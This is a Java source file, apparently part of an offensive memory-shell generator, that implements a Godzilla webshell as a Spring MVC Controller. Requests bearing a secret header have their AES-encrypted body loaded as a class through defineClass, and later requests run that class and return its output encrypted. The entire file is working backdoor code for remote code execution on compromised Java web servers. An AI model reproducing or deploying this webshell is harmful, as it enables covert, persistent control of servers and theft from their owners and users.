package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.Controller;

/**
 * Godzilla HW ControllerHandler 模板（JAVA_AES_RAW）。
 * <p>
 * 只包含当前加密器的协议，由 {@link GodzillaHwGenerator} 按配置选择；
 * 请求/响应统一通过反射访问，容器钩子只需传入 request/response。
 *
 * @author ReaJason
 */
public class GodzillaHwControllerHandlerRaw extends ClassLoader implements Controller {
    private static String key;
    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;


    public GodzillaHwControllerHandlerRaw() {
    }

    public GodzillaHwControllerHandlerRaw(ClassLoader parent) {
        super(parent);
    }

    @Override
    @SuppressWarnings("all")
    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
        try {
            run(request, response);
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return null;
    }

    @SuppressWarnings("all")
    private boolean run(Object request, Object response) throws Exception {
        String value = ((HttpServletRequest) request).getHeader(headerName);
        if (value == null || !value.contains(headerValue)) {
            return false;
        }
        byte[] data = x(readBody(request), false);
        if (payload == null) {
            payload = this.defineClass(data, 0, data.length);
            return true;
        }
        if (((HttpServletResponse) response).isCommitted()) {
            return true;
        }
        java.io.OutputStream outputStream = ((HttpServletResponse) response).getOutputStream();
        try {
            outputStream.write(x(execute(request, data), true));
        } catch (Throwable e) {
            e.printStackTrace();
        }
        outputStream.flush();
        outputStream.close();
        return true;
    }

    @SuppressWarnings("all")
    private static byte[] execute(Object request, byte[] data) throws Exception {
        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
        Object f = payload.newInstance();
        f.equals(arrOut);
        f.equals(request);
        f.equals(data);
        f.toString();
        return arrOut.toByteArray();
    }

    @SuppressWarnings("all")
    private static byte[] readBody(Object request) throws Exception {
        java.io.InputStream inputStream = ((HttpServletRequest) request).getInputStream();
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int read;
        while ((read = inputStream.read(buffer)) > 0) {
            outputStream.write(buffer, 0, read);
        }
        return outputStream.toByteArray();
    }
    @SuppressWarnings("all")
    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return cipher.doFinal(s);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }

}
